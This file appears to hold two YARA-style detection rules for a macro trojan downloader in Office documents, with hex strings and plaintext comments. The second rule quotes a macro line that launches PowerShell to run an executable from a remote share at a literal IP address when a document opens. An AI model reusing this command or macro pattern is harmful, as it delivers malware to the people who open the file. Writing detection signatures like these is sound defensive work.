
rule TrojanDownloader_O97M_Powdow_RVCD_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.RVCD!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {63 72 65 61 74 65 6f 62 6a 65 63 74 28 61 63 74 69 76 65 73 68 65 65 74 2e 70 61 67 65 73 65 74 75 70 2e 63 65 6e 74 65 72 68 65 61 64 65 72 29 } //1 createobject(activesheet.pagesetup.centerheader)
		$a_01_1 = {77 6f 72 6b 62 6f 6f 6b 5f 61 63 74 69 76 61 74 65 28 29 66 6f 72 65 61 63 68 63 65 6c 6c 69 6e 72 61 6e 67 65 28 22 62 32 3a 62 32 22 29 63 65 6c 6c 2e 76 61 6c 75 65 } //1 workbook_activate()foreachcellinrange("b2:b2")cell.value
		$a_01_2 = {67 67 67 2e 65 78 65 63 6d 65 74 68 6f 64 5f 28 61 63 74 69 76 65 73 68 65 65 74 2e 70 61 67 65 73 65 74 75 70 2e 6c 65 66 74 68 65 61 64 65 72 2c 66 38 64 66 30 30 29 } //1 ggg.execmethod_(activesheet.pagesetup.leftheader,f8df00)
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}
rule TrojanDownloader_O97M_Powdow_RVCD_MTB_2{
	meta:
		description = "TrojanDownloader:O97M/Powdow.RVCD!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 "
		
	strings :
		$a_01_0 = {63 72 65 61 74 65 6f 62 6a 65 63 74 28 22 77 73 63 72 69 70 74 2e 73 68 65 6c 6c 22 29 73 74 72 63 6f 6d 6d 61 6e 64 3d 22 70 6f 77 65 72 73 68 65 6c 6c 2e 65 78 65 2d 63 22 22 65 78 70 6c 6f 72 65 72 27 5c 5c 38 39 2e 32 33 2e 39 38 2e 32 32 5c 6c 6e 5c 27 3b 73 74 61 72 74 2d 73 6c 65 65 70 2d 73 65 63 6f 6e 64 73 31 3b 73 74 6f 70 2d 70 72 6f 63 65 73 73 2d 6e 61 6d 65 65 78 70 6c 6f 72 65 72 3b 5c 5c 38 39 2e 32 33 2e 39 38 2e 32 32 5c 6c 6e 5c 6b 6f 6e 73 74 61 6e 74 69 6e 2e 65 78 65 } //1 createobject("wscript.shell")strcommand="powershell.exe-c""explorer'\\89.23.98.22\ln\';start-sleep-seconds1;stop-process-nameexplorer;\\89.23.98.22\ln\konstantin.exe
		$a_01_1 = {64 6f 63 75 6d 65 6e 74 5f 6f 70 65 6e 28 29 } //1 document_open()
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1) >=2
 
}